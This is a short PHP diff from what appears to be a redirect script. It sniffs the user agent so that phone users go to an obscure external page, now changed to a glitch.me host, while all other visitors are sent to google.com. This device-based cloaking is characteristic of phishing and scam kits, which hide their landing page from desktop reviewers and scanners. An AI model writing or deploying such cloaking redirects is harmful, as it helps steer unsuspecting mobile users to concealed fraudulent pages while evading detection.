@@ -12,7 +12,7 @@ $ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
 if ($iphone || $android || $palmpre || $ipod || $berry == true) 
  {
  
-  header('Location: https://redirecionmasteriliamome.blogspot.com/');
+  header('Location: https://fluttering-shade-drum.glitch.me');
      
   }else{
  header('Location: https://google.com/');
